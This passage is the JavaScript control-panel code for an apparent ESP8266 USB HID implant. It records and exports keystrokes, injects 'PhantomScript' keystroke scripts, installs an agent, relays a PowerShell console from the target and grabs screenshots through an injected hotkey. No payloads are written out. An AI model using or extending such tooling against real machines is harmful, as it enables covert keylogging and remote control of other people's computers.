            <button id="script-pause" class="btn-warning" onclick="pauseScript()" disabled title="Pause execution">⏸ Pause</button>
            <button id="script-stop" class="btn-danger" onclick="stopScript()" disabled title="Stop execution">⏹ Stop</button>
        </div>

        <!-- Footer -->
        <div class="footer-text">Built with ♥ by the.corrupted_angel</div>
    </div>

    <script>
        // ========== GLOBAL STATE ==========
        let ws;  // Main WebSocket for text commands (HID, AT, recording)
        let screenshotWs = null;  // Dedicated WebSocket for binary image streaming
        let reconnectInterval;
        let isConnected = false;
        let autoScroll = true;
        let eventCount = 0;
        let isPageVisible = true;
        let reconnectAttempts = 0;

        // Recording state
        const RecState = { IDLE: 0, RECORDING: 1, STOPPED: 2, REPLAYING: 3 };
        let recState = RecState.IDLE;
        let recordingCount = 0;

        // PhantomScript state
        const ScriptState = { IDLE: 0, RUNNING: 1, PAUSED: 2, STOPPED: 3 };
        let scriptState = ScriptState.IDLE;
        let scriptLineCount = 0;

        // Device info cache
        let deviceInfo = {
            name: 'Not connected',
            type: '-',
            manufacturer: '-',
            vid: '-',
            pid: '-',
            serial: '-'
        };
        let deviceType = 'UNKNOWN';
        let waitingForInfoModal = false;  // Flag to show modal after receiving INFO response

        // Hybrid mode state
        let hybridModeEnabled = false;

        // Serial CDC and Storage mode states
        let serialModeEnabled = false;
        let storageModeEnabled = false;

        // Network bridge mode state
        let netbridgeModeEnabled = false;

        // Screenshot functionality state
        let screenshotImageData = [];
        let screenshotReceiving = false;
        let screenshotBytesReceived = 0;
        const MARKER_START = [0xFF, 0xD8, 0xFF, 0xAA];
        const MARKER_END = [0xFF, 0xD9, 0xFF, 0xBB];

        // Mouse state
        let mouseButtons = { left: false, right: false };
        let lastMousePos = { x: 0, y: 0 };

        // Keyboard state
        let heldKeys = new Set();
        let modifiers = 0;

        // OTA state
        let selectedFile = null;
        let selectedFactoryFile = null;
        let uploadStartTime = 0;
        let currentFirmwareVersion = 'Unknown';

        // ========== DOM ELEMENTS ==========
        const output = document.getElementById('output');
        const statusLed = document.getElementById('status-led');
        const statusText = document.getElementById('status-text');
        const mouseDeviceBtn = document.getElementById('mouse-device-btn');
        const keyboardDeviceBtn = document.getElementById('keyboard-device-btn');
        const shellBtn = document.getElementById('shell-btn');
        const screenBtn = document.getElementById('screen-btn');
        // const hybridToggle = document.getElementById('hybrid-toggle'); // Removed - replaced with buttons

        // ========== WEBSOCKET CONNECTION ==========
        function connectWebSocket() {
            if (!isPageVisible) return;

            if (reconnectInterval) {
                clearInterval(reconnectInterval);
                reconnectInterval = null;
            }

            if (ws) {
                try { ws.close(); } catch (e) {}
                ws = null;
            }

            const wsUrl = `ws://${window.location.hostname}/ws`;
            ws = new WebSocket(wsUrl);
            // No binaryType needed - main WebSocket only handles text

            ws.onopen = function() {
                console.log('[DEBUG] WebSocket connected');
                isConnected = true;
                reconnectAttempts = 0;
                statusLed.classList.add('connected');
                statusText.textContent = 'Connected';
                appendOutput('=== Connected to device ===\n', 'system-message');
                showToast('Connected successfully', 'success');

                console.log('[DEBUG] Restoring UI functionality...');
                // Restore full UI functionality after reconnection
                // DO NOT call fetchVersion() or updateMemoryStats() - causes crashes
                // fetchVersion();
                // updateMemoryStats();
                // hybridToggle was replaced with buttons, no longer need to enable/disable it

                // Update UI elements based on current state
                updateRecordingUI();
                updateScriptUI();
                updateInputButton();

                // Request device info to display in console on connection
                setTimeout(() => {
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        console.log('[CLIENT-DEBUG] Sending AT+INFO command to ESP8266...');
                        console.log('[CLIENT-DEBUG] WebSocket state:', ws.readyState, '(1=OPEN)');
                        ws.send('AT+INFO\r\n');
                        console.log('[CLIENT-DEBUG] AT+INFO command sent successfully');
                    } else {
                        console.log('[CLIENT-DEBUG] WebSocket not ready, cannot send AT+INFO');
                    }
                }, 200);  // Small delay to ensure everything is ready

                if (reconnectInterval) {
                    clearInterval(reconnectInterval);
                    reconnectInterval = null;
                }
            };

            ws.onmessage = function(event) {
                // Main WebSocket only handles text messages
                // Binary image data is handled by dedicated screenshotWs
                const msg = event.data;

                // DEBUG: Log INFO responses
                if (msg.includes('+INFO:') || msg.includes('> +INFO:')) {
                    console.log('[CLIENT-DEBUG] Received INFO response from ESP8266:');
                    console.log('[CLIENT-DEBUG] Message:', msg);
                    console.log('[CLIENT-DEBUG] Message length:', msg.length, 'bytes');
                }

                handleMessage(msg);
            };

            ws.onerror = function(error) {
                console.error('[ERROR] WebSocket error:', error);
            };

            ws.onclose = function() {
                console.log('[DEBUG] WebSocket closed');
                if (isPageVisible) {
                    isConnected = false;
                    statusLed.classList.remove('connected');
                    statusText.textContent = 'Disconnected';
                    appendOutput('=== Disconnected ===\n', 'error-message');
                    // hybridToggle was replaced with buttons, no longer need to disable it

                    // Always try to reconnect (infinite retries)
                    if (!reconnectInterval) {
                        reconnectAttempts++;
                        reconnectInterval = setInterval(function() {
                            if (isPageVisible) {
                                connectWebSocket();
                            }
                        }, 3000);
                    }
                } else {
                    isConnected = false;
                }
            };
        }

        // ========== MESSAGE HANDLING ==========
        let psReceiving = false;
        let psStatusUpdater = null;
        let psResponseBuffer = '';  // Buffer to accumulate base64 chunks

        function handleMessage(data) {
            // Handle PowerShell response markers and data (separate marker protocol)
            if (data === 'RESP_START:') {
                // Only accept response if console is open
                if (psConsoleOpen) {
                    psReceiving = true;
                    psResponseBuffer = '';  // Clear buffer for new response
                    updatePSStatus('executing');
                } else {
                    // Console closed - discard this response
                    console.log('[SERIAL] Discarding response - console not open');
                    psReceiving = false;
                }
                return;
            }

            if (data === ':RESP_END') {
                if (psConsoleOpen && psReceiving) {
                    // Decode any remaining buffered data (final chunk remainder)
                    if (psResponseBuffer.length > 0) {
                        try {
                            // Decode remaining base64 (with padding if needed)
                            const binaryString = atob(psResponseBuffer);
                            const bytes = new Uint8Array(binaryString.length);
                            for (let i = 0; i < binaryString.length; i++) {
                                bytes[i] = binaryString.charCodeAt(i);
                            }
                            const decoder = new TextDecoder('utf-8');
                            const decoded = decoder.decode(bytes);
                            appendToSerialMonitor(decoded);
                            console.log('[SERIAL] Decoded final remainder:', psResponseBuffer.length, 'chars');
                        } catch (e) {
                            console.error('[SERIAL] Final chunk decode error:', e);
                            console.error('[SERIAL] Remainder data:', psResponseBuffer);
                        }
                    }
                    psResponseBuffer = '';  // Clear buffer

                    // Add spacing after command output
                    const output = document.getElementById('ps-console-output');
                    if (output && !output.textContent.endsWith('\n\n')) {
                        if (output.textContent.endsWith('\n')) {
                            appendToSerialMonitor('\n');
                        } else {
                            appendToSerialMonitor('\n\n');
                        }
                    }
                    updatePSStatus('connected');
                }
                psReceiving = false;
                return;
            }

            // Response data - base64 encoded chunks (streaming decode)
            if (psReceiving && psConsoleOpen && data.length > 0) {
                // PowerShell sends multiple base64 chunks (one per Send-Data call)
                // Each chunk has its own padding: chunk1=chunk2=chunk3=
                // Decode each complete chunk when we find padding

                psResponseBuffer += data;

                // Process base64 chunks - decode with or without padding for real-time streaming
                while (psResponseBuffer.length > 0) {
                    const firstPaddingIdx = psResponseBuffer.indexOf('=');

                    if (firstPaddingIdx === -1) {
                        // No padding - decode complete 4-char groups for real-time streaming
                        const completeGroups = Math.floor(psResponseBuffer.length / 4) * 4;

                        if (completeGroups >= 4) {
                            const chunk = psResponseBuffer.substring(0, completeGroups);
                            psResponseBuffer = psResponseBuffer.substring(completeGroups);

                            try {
                                const binaryString = atob(chunk);
                                const bytes = new Uint8Array(binaryString.length);
                                for (let i = 0; i < binaryString.length; i++) {
                                    bytes[i] = binaryString.charCodeAt(i);
                                }
                                const decoder = new TextDecoder('utf-8');
                                const decoded = decoder.decode(bytes);
                                appendToSerialMonitor(decoded);
                                console.log('[SERIAL] Decoded (no pad):', chunk.length, 'chars →', decoded.length, 'bytes');
                            } catch (e) {
                                console.error('[SERIAL] Decode error (no pad):', e.message);
                                psResponseBuffer = '';  // Clear on error
                            }
                        }
                        break;  // Wait for more data
                    }

                    // Found padding - decode chunk with padding
                    let chunkEnd = firstPaddingIdx + 1;
                    if (psResponseBuffer[chunkEnd] === '=') {
                        chunkEnd++;  // Handle double padding
                    }

                    const chunk = psResponseBuffer.substring(0, chunkEnd);
                    psResponseBuffer = psResponseBuffer.substring(chunkEnd);

                    try {
                        const binaryString = atob(chunk);
                        const bytes = new Uint8Array(binaryString.length);
                        for (let i = 0; i < binaryString.length; i++) {
                            bytes[i] = binaryString.charCodeAt(i);
                        }
                        const decoder = new TextDecoder('utf-8');
                        const decoded = decoder.decode(bytes);
                        appendToSerialMonitor(decoded);
                        console.log('[SERIAL] Decoded (pad):', chunk.length, 'chars →', decoded.length, 'bytes');
                    } catch (e) {
                        console.error('[SERIAL] Decode error:', e.message);
                        // Continue to next chunk
                    }
                }

                return;
            }

            // Discard any response data if console is not open
            if (psReceiving && !psConsoleOpen) {
                console.log('[SERIAL] Discarding response chunk - console not open');
                return;
            }

            // Handle OTA update messages
            if (data.startsWith('OTA_')) {
                handleOTAMessage(data);
                return;
            }

            // Handle recording control messages
            if (data.startsWith('REC_')) {
                handleRecordingMessage(data);
                return;
            }

            // Handle script control messages
            if (data.startsWith('SCRIPT_')) {
                handleScriptMessage(data);
                return;
            }

            // Handle replay messages
            if (data.startsWith('REPLAY_')) {
                handleReplayMessage(data);
                return;
            }

            // Handle hybrid mode state updates
            if (data.startsWith('HYBRID_STATE:')) {
                handleHybridStateMessage(data);
                return;
            }

            // Handle device type updates (internal - don't display)
            if (data.startsWith('DEVICE_TYPE:')) {
                const type = data.substring(12).trim();
                deviceType = type;
                deviceInfo.type = type;
                updateInputButton();
                updateScriptUI();
                return;  // Don't display to user
            }

            // Handle device connection state (internal - don't display)
            if (data.startsWith('DEVICE_CONNECTED:')) {
                // Just internal state tracking - don't display
                return;
            }

            // Check for AT responses (ESP8266 adds "> " prefix to all AT responses)
            if (data.startsWith('> +INFO:')) {
                console.log('[CLIENT-DEBUG] Processing INFO response in handleMessage()');
                console.log('[CLIENT-DEBUG] Raw data:', data);

                parseDeviceInfo(data);
                // Display user-friendly parsed info
                const type = deviceInfo.type ? deviceInfo.type.charAt(0).toUpperCase() + deviceInfo.type.slice(1).toLowerCase() : 'Unknown';

                console.log('[CLIENT-DEBUG] Parsed device type:', type);

                // Check if no device is connected
                if (type.toLowerCase() === 'none') {
                    console.log('[CLIENT-DEBUG] No device connected - displaying message');
                    appendOutput('No device connected\n', 'system-message');
                } else {
                    // Normal device connected - show type and VID/PID only
                    const vid = deviceInfo.vid || 'N/A';
                    const pid = deviceInfo.pid || 'N/A';

                    console.log('[CLIENT-DEBUG] Device connected - Type:', type, 'VID:', vid, 'PID:', pid);
                    console.log('[CLIENT-DEBUG] Appending output to console...');

                    appendOutput(`Connected Device Type: ${type}\n`, 'system-message');
                    appendOutput(`VID: ${vid}  |  PID: ${pid}\n`, 'system-message');
                }

                // Show modal if info button was clicked
                if (waitingForInfoModal) {
                    waitingForInfoModal = false;
                    showDeviceModal();
                }
                return;
            }

            if (data.startsWith('> +TYPE:')) {
                parseDeviceType(data);
                // Make user-friendly
                const typeMatch = data.match(/TYPE[:\s]+(\w+)/i);
                if (typeMatch) {
                    const friendlyType = typeMatch[1].charAt(0).toUpperCase() + typeMatch[1].slice(1).toLowerCase();
                    appendOutput(`Device Type: ${friendlyType}\n`, 'system-message');
                }
                return;
            }

            if (data.startsWith('> +HYBRID:')) {
                const timestamp = new Date().toISOString();
                console.log(`[${timestamp}] [WS-RECEIVE] Received HYBRID response from ESP8266: "${data}"`);

                // Parse hybrid state
                const isOn = data.includes('ON');
                console.log(`[${timestamp}] [STATE-UPDATE] Parsing HYBRID state - detected: ${isOn ? 'ON' : 'OFF'}`);
                console.log(`[${timestamp}] [STATE-UPDATE] Previous hybridModeEnabled: ${hybridModeEnabled}, New: ${isOn}`);

                hybridModeEnabled = isOn;
                updateToggleUI('hybrid', isOn);
                updateHybridButton();
                updateInputButton();
                updateScriptUI();

                console.log(`[${timestamp}] [STATE-UPDATE] HYBRID state updated successfully. UI updated.`);

                // Make user-friendly
                const hybridState = isOn ? 'On' : 'Off';
                appendOutput(`Hybrid Mode: ${hybridState}\n`, 'system-message');
                return;
            }

            if (data.startsWith('> +SERIAL:')) {
                const timestamp = new Date().toISOString();
                console.log(`[${timestamp}] [WS-RECEIVE] Received SERIAL response from ESP8266: "${data}"`);

                // Parse serial mode state
                const isOn = data.includes('ON');
                console.log(`[${timestamp}] [STATE-UPDATE] Parsing SERIAL state - detected: ${isOn ? 'ON' : 'OFF'}`);
                console.log(`[${timestamp}] [STATE-UPDATE] Previous serialModeEnabled: ${serialModeEnabled}, New: ${isOn}`);

                serialModeEnabled = isOn;
                updateToggleUI('serial', isOn);
                updateShellButton();
                updateScreenButton();
                updateInstallAgentButton();

                console.log(`[${timestamp}] [STATE-UPDATE] SERIAL state updated successfully. UI updated.`);

                // Make user-friendly
                const serialState = isOn ? 'On' : 'Off';
                appendOutput(`Serial Mode: ${serialState}\n`, 'system-message');
                return;
            }

            if (data.startsWith('> +STORAGE:')) {
                const timestamp = new Date().toISOString();
                console.log(`[${timestamp}] [WS-RECEIVE] Received STORAGE response from ESP8266: "${data}"`);

                // Parse storage mode state
                const isOn = data.includes('ON');
                console.log(`[${timestamp}] [STATE-UPDATE] Parsing STORAGE state - detected: ${isOn ? 'ON' : 'OFF'}`);
                console.log(`[${timestamp}] [STATE-UPDATE] Previous storageModeEnabled: ${storageModeEnabled}, New: ${isOn}`);

                storageModeEnabled = isOn;
                updateToggleUI('storage', isOn);
                updateInstallAgentButton();
                updatePSInstallAgentButton();

                console.log(`[${timestamp}] [STATE-UPDATE] STORAGE state updated successfully. UI updated.`);

                // Make user-friendly
                const storageState = isOn ? 'On' : 'Off';
                appendOutput(`Storage Mode: ${storageState}\n`, 'system-message');
                return;
            }

            if (data.startsWith('> +NETBRIDGE:')) {
                const timestamp = new Date().toISOString();
                console.log(`[${timestamp}] [WS-RECEIVE] Received NETBRIDGE response from ESP8266: "${data}"`);

                // Parse network bridge mode state
                const isOn = data.includes('ON');
                console.log(`[${timestamp}] [STATE-UPDATE] Parsing NETBRIDGE state - detected: ${isOn ? 'ON' : 'OFF'}`);
                console.log(`[${timestamp}] [STATE-UPDATE] Previous netbridgeModeEnabled: ${netbridgeModeEnabled}, New: ${isOn}`);

                netbridgeModeEnabled = isOn;
                updateToggleUI('netbridge', isOn);

                console.log(`[${timestamp}] [STATE-UPDATE] NETBRIDGE state updated successfully. UI updated.`);

                // Make user-friendly
                const netbridgeState = isOn ? 'On' : 'Off';
                appendOutput(`Network Bridge Mode: ${netbridgeState}\n`, 'system-message');
                return;
            }

            if (data.startsWith('> OK')) {
                // Suppress OK responses - they're not interesting to users
                return;
            }

            if (data.startsWith('> ')) {
                // Any other AT response - just display it
                appendOutput(data, 'at-response');
                return;
            }

            // HID events
            if (data.includes('⌨️') || data.includes('🖱️') || data.includes('🎵') || data.includes('⚡')) {
                eventCount++;
                let className = '';
                if (data.includes('⌨️')) className = 'hid-keyboard';
                else if (data.includes('🖱️')) className = 'hid-mouse';
                else if (data.includes('🎵')) className = 'hid-media';
                else if (data.includes('⚡')) className = 'hid-system';
                appendOutput(data, className);
                return;
            }

            // System messages
            if (data.startsWith('===')) {
                appendOutput(data, 'system-message');
                return;
            }

            // Default
            appendOutput(data);
        }

        // ========== OTA MESSAGE HANDLING ==========
        let otaLastProgress = 0; // Global tracker to prevent backward progress jumps

        function handleOTAMessage(msg) {
            if (msg.startsWith('OTA_PROGRESS:')) {
                const percent = parseInt(msg.substring(13));
                // Only update if progress moved forward (prevent backward jumps from WebSocket)
                if (percent > otaLastProgress) {
                    otaLastProgress = percent;
                    document.getElementById('progress-bar').style.width = percent + '%';
                    document.getElementById('progress-text').textContent = percent + '%';
                    document.getElementById('ota-status').textContent = 'Uploading ...';
                }
            } else if (msg === 'OTA_REBOOTING') {
                // Device is about to reboot - this is EXPECTED
                document.getElementById('progress-bar').style.width = '100%';
                document.getElementById('progress-text').textContent = '100%';
                document.getElementById('ota-status').textContent = '✓ Upload complete! Device flashing firmware...';
                document.getElementById('ota-status').style.color = '#66bb6a';
                showToast('Flashing firmware...', 'success');
                showOTACountdown();
            } else if (msg.startsWith('OTA_ERROR:')) {
                const error = msg.substring(10);
                document.getElementById('ota-status').textContent = '✗ Error: ' + error;
                document.getElementById('ota-status').style.color = '#ef5350';
                showToast('OTA Error: ' + error, 'error');
                document.getElementById('upload-btn').disabled = false;
            }
        }

        // ========== OTA COUNTDOWN AND RELOAD ==========
        function showOTACountdown() {
            let countdown = 20;
            const statusEl = document.getElementById('ota-status');

            const timer = setInterval(() => {
                countdown--;

                if (countdown > 15) {
                    statusEl.textContent = `⚡ Flashing firmware... (${countdown}s)`;
                    statusEl.style.color = '#90caf9';
                } else if (countdown > 10) {
                    statusEl.textContent = `🔔 Rebooting device... (${countdown}s)`;
                    statusEl.style.color = '#ffb74d';
                } else if (countdown > 5) {
                    statusEl.textContent = `📶 Waiting for WiFi... (${countdown}s)`;
                    statusEl.style.color = '#ba68c8';
                } else if (countdown > 0) {
                    statusEl.textContent = `🔔 Reloading in ${countdown}s...`;
                    statusEl.style.color = '#66bb6a';
                } else {
                    clearInterval(timer);
                    statusEl.textContent = '✓ Reloading page now...';
                    statusEl.style.color = '#66bb6a';

                    setTimeout(() => {
                        // Force reload with cache clear
                        window.location.href = window.location.href.split('?')[0] + '?t=' + Date.now();
                    }, 500);
                }
            }, 1000);
        }

        // ========== RECORDING MESSAGE HANDLING ==========
        function handleRecordingMessage(msg) {
            if (msg.startsWith('REC_INFO:')) {
                const json = msg.substring(9);
                try {
                    const info = JSON.parse(json);
                    recState = info.state;
                    recordingCount = info.count;
                    updateRecordingUI();
                } catch (e) {
                    console.error('Failed to parse recording info:', e);
                }
            } else if (msg === 'REC_STARTED') {
                recState = RecState.RECORDING;
                recordingCount = 0;
                updateRecordingUI();
                appendOutput('🔴 Recording started...\n', 'success-message');
                showToast('Recording started', 'success');
            } else if (msg.startsWith('REC_STOPPED:')) {
                const count = parseInt(msg.substring(12));
                recState = RecState.STOPPED;
                recordingCount = count;
                updateRecordingUI();
                appendOutput(`⏹¸ Recording stopped. Captured ${count} events\n`, 'success-message');
                showToast(`Recording saved: ${count} events`, 'success');
            } else if (msg === 'REC_CLEARED') {
                recState = RecState.IDLE;
                recordingCount = 0;
                updateRecordingUI();
                appendOutput('🗑️ Recording cleared\n', 'system-message');
                showToast('Recording cleared', 'success');
            } else if (msg.startsWith('REC_COUNT:')) {
                recordingCount = parseInt(msg.substring(10));
                updateRecordingUI();
            } else if (msg.startsWith('REC_EXPORT_DATA:')) {
                const data = msg.substring(16);
                downloadRecording(data);
            } else if (msg.startsWith('REC_ERROR:')) {
                const error = msg.substring(10);
                showToast(error, 'error');
            }
        }

        function downloadRecording(data) {
            try {
                // Parse raw HID data into human-readable format
                const lines = data.split('\n');
                let parsedOutput = '';
                let eventNumber = 1;

                for (let line of lines) {
                    line = line.trim();
                    if (line.length === 0) continue;

                    // Parse line: timestamp,HID:RR:LLLL:HHHH...
                    const parts = line.split(',');
                    if (parts.length < 2) continue;

                    const timestamp = parseInt(parts[0]);
                    const hidCommand = parts.slice(1).join(','); // Rejoin in case HID data has commas

                    // Parse HID command
                    if (hidCommand.startsWith('HID:')) {
                        const hidParts = hidCommand.substring(4).split(':');
                        if (hidParts.length >= 3) {
                            const reportId = hidParts[0];
                            const length = hidParts[1];
                            const hexData = hidParts[2];

                            // Convert hex string to byte array
                            const bytes = [];
                            for (let i = 0; i < hexData.length; i += 2) {
                                bytes.push(parseInt(hexData.substr(i, 2), 16));
                            }

                            // Parse based on report ID
                            let parsed = '';
                            if (reportId === '01') {
                                // Keyboard report
                                parsed = hidParser.parseKeyboardReport(bytes);
                            } else if (reportId === '02') {
                                // Mouse report
                                parsed = hidParser.parseMouseReport(bytes);
                            } else if (reportId === '03') {
                                // Consumer control report
                                parsed = hidParser.parseConsumerReport(bytes);
                            } else {
                                parsed = `[Unknown Report ID: 0x${reportId}]`;
                            }

                            // Format: [timestamp_ms] Event# parsed_data
                            const timeStr = String(timestamp).padStart(8, ' ');
                            const eventStr = String(eventNumber).padStart(5, ' ');
                            parsedOutput += `[${timeStr}ms] #${eventStr}: ${parsed}\n`;
                            eventNumber++;
                        }
                    }
                }

                // Generate timestamp-based filename
                const now = new Date();
                const timestamp = now.getFullYear() +
                    String(now.getMonth() + 1).padStart(2, '0') +
                    String(now.getDate()).padStart(2, '0') + '_' +
                    String(now.getHours()).padStart(2, '0') +
                    String(now.getMinutes()).padStart(2, '0') +
                    String(now.getSeconds()).padStart(2, '0');
                const filename = `recording_${timestamp}.txt`;

                // Create blob and download
                const blob = new Blob([parsedOutput], { type: 'text/plain' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);

                showToast(`Exported: ${filename}`, 'success');
            } catch (e) {
                console.error('Failed to export recording:', e);
                showToast('Export failed', 'error');
            }
        }

        // ========== SCRIPT MESSAGE HANDLING ==========
        function handleScriptMessage(msg) {
            if (msg.startsWith('SCRIPT_INFO:')) {
                const info = msg.substring(12);
                const [state, lineCount] = info.split(':');
                scriptLineCount = parseInt(lineCount) || 0;

                if (state === 'NONE') {
                    scriptState = ScriptState.IDLE;
                    scriptLineCount = 0;
                } else if (state === 'IDLE') {
                    scriptState = ScriptState.IDLE;
                } else if (state === 'RUNNING') {
                    scriptState = ScriptState.RUNNING;
                } else if (state === 'STOPPED') {
                    scriptState = ScriptState.STOPPED;
                }

                updateScriptUI();
            } else if (msg.startsWith('SCRIPT_STARTED:')) {
                const lineCount = parseInt(msg.substring(15));
                scriptState = ScriptState.RUNNING;
                scriptLineCount = lineCount;
                updateScriptUI();
                // Simplified output for agent installation
                if (!isAgentInstalling) {
                    appendOutput(`▶¸ PhantomScript executing (${lineCount} lines)...\n`, 'success-message');
                    showToast('Script started', 'success');
                }
            } else if (msg === 'SCRIPT_COMPLETED') {
                scriptState = ScriptState.IDLE;
                updateScriptUI();
                // Simplified output for agent installation
                if (isAgentInstalling) {
                    appendOutput('✓ Agent installation completed\n', 'success-message');
                    showToast('Agent installed successfully', 'success');
                    isAgentInstalling = false;  // Reset flag
                } else {
                    appendOutput('✓ Script execution completed\n', 'success-message');
                    showToast('Script completed', 'success');
                }
            } else if (msg === 'SCRIPT_STOPPED') {
                scriptState = ScriptState.STOPPED;
                updateScriptUI();
                appendOutput('⏹¸ Script execution stopped\n', 'system-message');
                showToast('Script stopped', 'info');
            } else if (msg === 'SCRIPT_PAUSED') {
                scriptState = ScriptState.PAUSED;
                updateScriptUI();
                appendOutput('⏸¸ Script execution paused\n', 'system-message');
                showToast('Script paused', 'info');
            } else if (msg === 'SCRIPT_RESUMED') {
                scriptState = ScriptState.RUNNING;
                updateScriptUI();
                appendOutput('▶¸ Script execution resumed\n', 'system-message');
                showToast('Script resumed', 'success');
            } else if (msg === 'SCRIPT_DELETED') {
                scriptState = ScriptState.IDLE;
                scriptLineCount = 0;
                updateScriptUI();
                appendOutput('🗑️ Script deleted\n', 'system-message');
                showToast('Script deleted', 'success');
            } else if (msg.startsWith('SCRIPT_ERROR:')) {
                const error = msg.substring(13);
                scriptState = ScriptState.STOPPED;
                updateScriptUI();
                // Simplified output for agent installation
                if (isAgentInstalling) {
                    appendOutput(`❌ Agent installation failed: ${error}\n`, 'error-message');
                    showToast(`Agent installation failed: ${error}`, 'error');
                    isAgentInstalling = false;  // Reset flag
                } else {
                    appendOutput(`❌ Script error: ${error}\n`, 'error-message');
                    showToast(`Script error: ${error}`, 'error');
                }
            } else if (msg.startsWith('SCRIPT_SETTINGS:')) {
                // Received current script settings
                console.log('[SETTINGS] === RECEIVED SETTINGS FROM ESP8266 ===');
                const json = msg.substring(16);
                console.log('[SETTINGS] Raw JSON:', json);
                try {
                    const settings = JSON.parse(json);
                    console.log('[SETTINGS] Parsed settings:', settings);
                    updateScriptSettingsUI(settings);
                } catch (e) {
                    console.error('[SETTINGS] Failed to parse script settings:', e);
                    console.error('[SETTINGS] Raw message was:', msg);
                    showToast('Error parsing script settings', 'error');
                }
            } else if (msg === 'SCRIPT_SETTINGS_OK') {
                console.log('[SETTINGS] === RECEIVED SAVE SUCCESS ===');
                const statusEl = document.getElementById('script-settings-status');
                statusEl.textContent = '✓ Settings saved successfully';
                statusEl.style.color = '#66bb6a';
                showToast('Script settings saved', 'success');
            } else if (msg.startsWith('SCRIPT_SETTINGS_ERROR:')) {
                const error = msg.substring(22);
                console.error('[SETTINGS] === RECEIVED SAVE ERROR ===');
                console.error('[SETTINGS] Error:', error);
                const statusEl = document.getElementById('script-settings-status');
                statusEl.textContent = '✗ Error: ' + error;
                statusEl.style.color = '#ef5350';
                showToast('Error: ' + error, 'error');
            } else if (msg === 'SCRIPT_SETTINGS_RESET_OK') {
                console.log('[SETTINGS] === RECEIVED RESET SUCCESS ===');
                const statusEl = document.getElementById('script-settings-status');
                statusEl.textContent = '✓ Settings reset to defaults';
                statusEl.style.color = '#66bb6a';
                showToast('Script settings reset', 'success');
                // Request updated settings
                if (isConnected && ws && ws.readyState === WebSocket.OPEN) {
                    console.log('[SETTINGS] Requesting updated settings after reset');
                    ws.send('SCRIPT_SETTINGS_GET\r\n');
                }
            }
        }

        // ========== REPLAY MESSAGE HANDLING ==========
        let lastProgressMsg = '';
        function handleReplayMessage(msg) {
            if (msg === 'REPLAY_START') {
                recState = RecState.REPLAYING;
                updateRecordingUI();
                appendOutput(`▶¸ Replaying ${recordingCount} events...\n`, 'system-message');
                showToast('Replay started', 'info');
                lastProgressMsg = '';
            } else if (msg.startsWith('REPLAY_PROGRESS:')) {
                const progress = msg.substring(16);
                // Only log progress every few events to avoid spam
                if (lastProgressMsg !== progress) {
                    lastProgressMsg = progress;
                    // Optional: show progress in output every N events
                    const [current, total] = progress.split('/');
                    if (parseInt(current) % 10 === 0 || parseInt(current) === parseInt(total)) {
                        appendOutput(`  Progress: ${progress}\n`, 'system-message');
                    }
                }
            } else if (msg === 'REPLAY_COMPLETE') {
                recState = RecState.STOPPED;
                updateRecordingUI();
                appendOutput('✓ Replay complete\n', 'success-message');
                showToast('Replay complete', 'success');
            }
        }

        // ========== HYBRID MODE MESSAGE HANDLING ==========
        function handleHybridStateMessage(msg) {
            const state = msg.substring(13).trim();
            hybridModeEnabled = (state === 'ON');
            updateHybridButton();
            updateInputButton();
        }

        function updateHybridButton() {
            // Hybrid toggle was replaced with buttons, so this function is no longer needed
            // Kept as no-op to avoid breaking existing code that calls it
            return;
        }

        function toggleHybrid() {
            // This function is no longer used since toggle was replaced with buttons
            // Kept for compatibility in case old code still calls it
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            // Toggle to opposite of current state
            const newState = hybridModeEnabled ? 'OFF' : 'ON';
            ws.send('HYBRID_SET:' + newState);

            // Update local state immediately (optimistic update)
            hybridModeEnabled = !hybridModeEnabled;
            updateHybridButton();
            updateInputButton();

            showToast(hybridModeEnabled ? 'Enabling hybrid mode...' : 'Disabling hybrid mode...', 'info');

            // Query type after toggle to update input button state
            setTimeout(() => {
                sendATCommand('AT+TYPE');
            }, 200);
        }

        // ========== SCREENSHOT FUNCTIONALITY ==========

        function sendScreenCaptureCommand() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }

            // Send CTRL+ALT+SHIFT+V as raw HID report (exactly like PhantomScript does)
            // HID Keyboard Report format: HID:01:0008:MMRRKKKKKKKKKKKKKKK
            // MM = Modifiers byte (CTRL=0x01 | SHIFT=0x02 | ALT=0x04 = 0x07)
            // RR = Reserved (0x00)
            // KK = 6 key slots (V=0x19 in slot 1, rest 0x00)

            console.log('Sending screen capture: CTRL+ALT+SHIFT+V (raw HID)');

            // Press: CTRL+ALT+SHIFT+V
            const hidPress = 'HID:01:0008:070019000000000000';
            ws.send(hidPress + '\r\n');

            // Release: all zeros after 100ms (longer hold for reliability)
            setTimeout(() => {
                const hidRelease = 'HID:01:0008:0000000000000000';
                ws.send(hidRelease + '\r\n');
                console.log('Released keys');
            }, 100);
        }

        function openScreenAndCapture() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }

            // Open modal first
            openScreenshotModal();

            // Send capture command immediately
            sendScreenCaptureCommand();
        }

        function captureScreenshotAgain() {
            // Reset image viewer state
            screenshotImageData = [];
            screenshotReceiving = false;
            screenshotBytesReceived = 0;

            const img = document.getElementById('screenshot-image');
            img.style.display = 'none';
            if (img.src && img.src.startsWith('blob:')) {
                URL.revokeObjectURL(img.src);
                img.src = '';
            }

            document.getElementById('screenshot-status').textContent = 'Waiting for screenshot...';

            // Send capture command
            sendScreenCaptureCommand();
            showToast('Capturing screenshot...', 'info');
        }

        function downloadScreenshot() {
            const img = document.getElementById('screenshot-image');

            if (!img.src || img.style.display === 'none') {
                showToast('No screenshot to download', 'error');
                return;
            }

            // Generate timestamp-based filename
            const now = new Date();
            const timestamp = now.getFullYear() +
                String(now.getMonth() + 1).padStart(2, '0') +
                String(now.getDate()).padStart(2, '0') + '_' +
                String(now.getHours()).padStart(2, '0') +
                String(now.getMinutes()).padStart(2, '0') +
                String(now.getSeconds()).padStart(2, '0');
            const filename = `screenshot_${timestamp}.png`;

            // Download using anchor tag
            const a = document.createElement('a');
            a.href = img.src;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            showToast(`Downloaded: ${filename}`, 'success');
        }

        function openScreenshotModal() {
            // Reset state
            screenshotImageData = [];
            screenshotReceiving = false;
            screenshotBytesReceived = 0;

            const img = document.getElementById('screenshot-image');
            img.style.display = 'none';
